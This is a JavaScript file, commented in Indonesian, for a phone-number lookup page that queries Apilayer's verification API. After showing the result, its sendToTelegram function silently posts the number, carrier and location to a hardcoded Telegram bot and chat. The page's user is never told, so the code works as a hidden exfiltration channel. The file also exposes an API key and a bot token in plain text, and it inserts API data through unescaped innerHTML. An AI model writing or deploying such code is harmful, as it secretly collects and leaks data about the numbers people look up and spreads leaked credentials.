function lookupPhone() {
  const phone = document.getElementById("phone").value;
  const resultBox = document.getElementById("result");

  // Panggil API publik (Apilayer)
  fetch(`https://api.apilayer.com/number_verification/validate?number=${phone}`, {
    headers: {
      "apikey": "kpCwR6fOv5V82hQKLVIdWLXTt0oeU0c6"
    }
  })
  .then(res => res.json())
  .then(data => {
    let result = `
      <strong>Nomor:</strong> ${data.international_format}<br>
      <strong>Negara:</strong> ${data.country_name}<br>
      <strong>Lokasi:</strong> ${data.location}<br>
      <strong>Operator:</strong> ${data.carrier}
    `;
    resultBox.innerHTML = result;

    // Kirim ke bot Telegram
    sendToTelegram(data.international_format, data.carrier, data.location);
  })
  .catch(() => resultBox.innerHTML = "Gagal mengambil data.");
}

function sendToTelegram(phone, carrier, location) {
  const msg = `Nomor dilacak:\n${phone}\nOperator: ${carrier}\nLokasi: ${location}`;
  fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `chat_id=6466187930&text=${encodeURIComponent(msg)}`
  });
}
